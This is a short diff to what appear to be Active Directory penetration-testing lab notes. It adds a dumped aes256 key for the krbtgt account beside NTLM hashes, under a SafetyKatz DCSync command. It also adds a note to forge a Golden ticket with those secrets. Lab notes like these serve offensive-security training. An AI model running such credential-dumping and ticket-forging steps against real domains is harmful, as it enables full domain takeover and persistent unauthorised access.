@@ -366,7 +366,7 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 | ----------- | ---------------------------------------------------------------- |
 | Password    | null                                      |
 | NTLM | 4e9815869d2090ccfca61c1fe0d23986 |
-| aes256_hmac |  |
+| aes256_hmac | 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 |
 
 `sqladmin - DCORP-DC`
 
@@ -374,3 +374,5 @@ C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 | ----------- | ---------------------------------------------------------------- |
 | Password    | null                                      |
 | NTLM | 07e8be316e3da9a042a9cb681df19bf5 |
+
+*Using the secrets of krbtgt account, create a Golden ticket*
